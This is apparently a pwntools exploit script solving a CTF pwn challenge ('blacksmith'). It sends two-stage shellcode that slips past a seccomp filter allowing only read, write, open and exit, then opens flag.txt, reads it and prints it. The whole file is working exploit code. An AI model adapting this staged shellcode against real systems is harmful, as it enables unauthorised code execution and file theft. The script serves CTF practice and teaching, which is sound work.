#!/usr/bin/env python3

from pwn import *

e = ELF("./blacksmith_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(shield+0x8c)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # The shield() allows 63-byte input to be executed.
    # However, the sec() only allows: read(), write(), open(), exit()
    # Directly read, open, and write the flag.txt output to screen will exceed the buffer length.
    # So we need staged payloads.

    # Stage 1: read more payloads
    r.sendlineafter(b'>', b'1')
    r.sendlineafter(b'>', b'2')
    payload_read_more = asm('''
                    xor rax, rax
                    xor rdi, rdi
                    sub rsp, 0x100
                    mov rsi, rsp
                    mov rdx, 0x100
                    syscall
                    jmp rsp
                  ''')
    r.sendlineafter(b'>', payload_read_more)

    payload_read_flag = asm('''
                    xor rax, rax
                    push rax
                    mov rax, 0x7478742e67616c66
                    push rax

                    mov rdi, rsp
                    mov rax, 2
                    xor rsi, rsi
                    syscall

                    mov rdi, rax
                    xor rax, rax
                    sub rsp, 0x100
                    mov rsi, rbp
                    mov rdx, 0x100
                    syscall

                    mov rdi, 1
                    mov rax, 1
                    syscall
                  ''')
    r.sendline(payload_read_flag)

    r.interactive()

if __name__ == "__main__":
    main()
